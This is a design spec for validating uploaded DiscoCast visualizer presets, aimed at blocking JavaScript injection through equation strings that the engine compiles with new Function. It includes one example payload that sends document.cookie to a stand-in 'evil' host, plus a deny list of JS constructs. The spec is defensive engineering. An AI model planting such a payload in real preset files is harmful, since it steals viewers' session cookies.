# DiscoCast Preset Validation & Upload Safety — Spec

> Single source of truth for validating shared preset uploads: stopping malicious
> code injection and confirming a file is a genuine, importable DiscoCast preset.
> Gates the public preset gallery/sharing. Sibling to [`discocast-admin-dev.md`](discocast-admin-dev.md).

## Status
- **State:** PLANNED — spec only, nothing built. Captured 2026-06-17 after tracing the
  real import/export/load path in the app.
- **Forcing function:** the public **submission/gallery page** (next feature). Until that
  ships, presets are only ever imported from a user's own disk (low risk). The gallery turns
  that into *distributing strangers' presets to everyone* — so validation must land FIRST.
- **Build order:** validation library → wire into `/api/submit` → THEN the front-facing
  submission page + gallery.

## The critical risk (traced in code, not hypothetical)

The engine compiles preset **equation strings into executable JavaScript**:
```js
// src/vendor/butterchurn.js:6752+
preset.frame_eqs = new Function('a', preset.frame_eqs_str + " return a;");
// …same for init_eqs_str, pixel_eqs_str, and every shapes[].*_eqs_str / waves[].*_eqs_str
```
And a preset's own strings reach it:
- **Export** ([customPresets.js:228](src/customPresets.js#L228)) does `const exported = { ...preset }` — it serializes the **entire** preset verbatim: `frame_eqs_str`, `init_eqs_str`, `pixel_eqs_str`, `warp`, `comp`, `shapes[]`, `waves[]`, plus base64-inlined images.
- **Import** ([customPresets.js:256](src/customPresets.js#L256)) only checks `data.name` exists. **No sanitization** of any code string.
- **Load** ([visualizer.js:592‑612](src/visualizer.js#L592)) keeps the preset's `frame_eqs_str` as `base` and **concatenates** the DiscoCast-generated motion/react/anim equations onto it, then hands the result to the engine → `new Function`.

**Conclusion:** a shared `.json` with `frame_eqs_str: "fetch('//evil',{method:'POST',body:document.cookie}); return a;"` runs **arbitrary JS in every viewer's browser** on play. This is the #1 thing the validation system must close.

## Threat surfaces, ranked
1. **Equation strings → `new Function` (CRITICAL / RCE).** `*_eqs_str` (and legacy `*_eqs`) on the preset and on each `shapes[]` / `waves[]`.
2. **Warp / comp shader source** (`preset.warp`, `preset.comp`) — raw GLSL; malicious shaders = GPU hang/crash (DoS), hard to prove safe statically.
3. **Embedded media** (`images[]._inlinedDataUrl`, base64) — huge blobs = memory/storage DoS; must be size-capped, verified as real decodable images, re-encoded.
4. **Stored XSS** — `name` / `description` rendered to other users in the gallery (admin already escapes; gallery must too).
5. **Prototype pollution** — `__proto__` / `constructor` / `prototype` keys poisoning objects on merge.

## Design principle: **distribute data, not code — reference the base, don't inline it**

A DiscoCast editor preset is **structured params** (`motionEngine`, `motionReact`, `waveReact`,
`flowStyle`, `imageWarp`, `baseVals`, colours, enums) built **on top of a base preset**. On load,
the app **regenerates** the motion/react/warp equations from those params — it does **not** need
the file's baked equation strings for that part. The only code that *must* travel is the **base
preset's** eqs/shaders.

So the architecture:
- **Carry the base by reference, not by value.** The app already tags a base (`_bundledBase`,
  `baseName` — [inspector.js](src/editor/inspector.js)). If the export stores a stable base id/name
  and the importer re-resolves it from the **local trusted bundled library (1,144 presets)**, then
  the untrusted file carries **only structured params + a base reference** — zero executable strings.
  *(Open item: confirm the export retains a resolvable base reference for every shareable preset.)*
- **Anything that still arrives as a code string is dropped or validated**, never trusted.

## Validation architecture (defense in depth)

### Gate 1 — server, at upload (the security boundary; can't be bypassed)
1. **Schema allowlist.** Define the canonical export schema (version `schemaVersion: 1`). Validate
   types / ranges / enums. **Drop every key not on the allowlist.**
2. **Strip executable strings.** Remove `frame_eqs_str`, `init_eqs_str`, `pixel_eqs_str`, `warp`,
   `comp`, and the `*_eqs_str` on every shape/wave. Rely on local regeneration + base reference.
   - If a submission *needs* raw eqs (a custom MilkDrop preset not in the bundled set), either (a)
     **disallow it from the public gallery in v1**, or (b) validate the strings against the **EEL
     grammar only** (Milkdrop expression language) and reject anything with JS constructs
     (`fetch`, `=>`, backticks, `window.`, `document.`, `import`, `[`-indexing into globals, etc.).
     Never accept pre-transpiled JS.
3. **Sanitize keys** — strip `__proto__` / `constructor` / `prototype`.
4. **Media** — cap each image + total payload; decode-verify it's a real image; re-encode to strip
   anything smuggled in the bytes.
5. **Text** — length-cap and store raw; escape on render (never trust at display time).

### Gate 2 — client, at import (defense in depth — presets also arrive from disk)
The app's own `importPreset` should run the **same** validation/sanitization before anything reaches
the engine. Worth doing **regardless of the gallery** — it closes the present (small) disk-import hole.
Best as a **shared validation module** imported by both the app and the discocast server.

### "Is it a valid DiscoCast import?" — the validity test (two layers)
1. **Static schema validation** — structure / version / types / required fields (fast, deterministic).
   Replaces today's loose sniff (`p.shapes || p.waves || p.baseVals`, [packInstaller.js:26](src/packInstaller.js#L26)).
2. **Headless load smoke test** — reuse the existing `npm run verify:packs` harness (Playwright +
   SwiftShader) to load the **sanitized** preset in a throwaway headless instance and confirm it
   compiles + renders N frames. Proves importability AND catches broken/malicious shaders.
   - **Caveat:** the headless run is a *validity* check, NOT a safety boundary. The static
     code-stripping (Gate 1) is what makes it safe to run; the render test only confirms it works.
     Run it isolated; never treat "it rendered" as "it's safe."

### Backstop
Keep the **moderation queue** (already built). Surface an admin flag like **"⚠ contained custom code
(stripped)"** so any submission that tried to smuggle eqs/shaders gets extra human scrutiny.

## Canonical schema — first sketch (to be finalized)
**Allowed (data):** `schemaVersion`, `name`, `description`, base reference (`baseName`/base id),
`motionEngine`, `motionReact`, `waveReact`, `flowStyle`, `imageWarp` (params only), `baseVals`
(numeric), structured `shapes[]` / `waves[]` (numeric baseVals + motion/react params, **no** `*_eqs_str`),
colours/enums, `images[]` (type, texName, transform params, constrained `_inlinedDataUrl`).
**Stripped/validated (code):** `frame_eqs_str`, `init_eqs_str`, `pixel_eqs_str`, `warp`, `comp`,
`shapes[].*_eqs_str`, `waves[].*_eqs_str`, legacy `*_eqs`.

## Open decisions
1. **Does every shareable preset retain a resolvable base reference?** (If yes → reference-not-inline
   eliminates code entirely for the common case. If some don't → need the EEL validator path.)
2. **Allow raw/custom MilkDrop presets in the public gallery at all in v1?** (Recommend: no — gallery
   accepts only structured editor presets; raw MilkDrop import stays a local-only, own-risk feature.)
3. **Shared validation module** location so app + server use identical logic (npm workspace? copied
   file? small published package?).
4. **EEL grammar validator** — build vs. reuse `milkdrop-eel-parser`'s parse-only mode to accept/reject.

## Then: front-facing submission page + gallery (the user's next ask)
Once validation exists and is wired into `/api/submit`: build the public **gallery** (browse approved
presets, big preview, one-click import) and fold the upload-safety messaging into the submit wizard
(clear rejection reasons from Gate 1). Spec that in [`discocast-admin-dev.md`](discocast-admin-dev.md)
or a `discocast-gallery-dev.md` when we get there.
